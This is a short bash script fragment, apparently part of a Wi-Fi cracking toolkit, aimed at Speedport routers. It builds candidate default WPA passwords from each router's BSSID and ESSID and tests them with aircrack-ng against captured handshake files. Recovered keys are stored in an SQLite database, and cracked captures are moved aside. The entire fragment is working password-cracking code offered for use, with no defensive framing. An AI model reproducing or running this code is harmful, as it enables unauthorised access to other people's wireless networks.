# keygen code adapted from https://www.zebradem.com/wiki/index.php?title=Router_Standardpassw%C3%B6rter#.28diverse_Modelle:_500.2C_700.2C_....29
# generate keys
PRE="SP-"
D=${bssid:13:1}
E=${bssid:15:1}
F=${bssid:16:1}
G=${essid:9:1}
H=${essid:10:1}
for X in {0..9}; do
    for Y in {0..9}; do
        for Z in {0..9}; do
            echo $PRE$G$Z$H$D$E$F$X$Y$Z >> "$path"wlspeedport
        done
    done
done

# test keys
psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlspeedport  2>/dev/null | grep FOUND | grep -oE 'SP-[0-9a-zA-Z]{9}' | sort -u`
"$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
rm -f "$path"wl* 2>/dev/null
if [ ${#psk} -gt 7 ]; then
    echo "Key $psk found for BSSID $bssid"
    "$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
    echo "$psk" >> "$path$wl"known
    mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
    continue
fi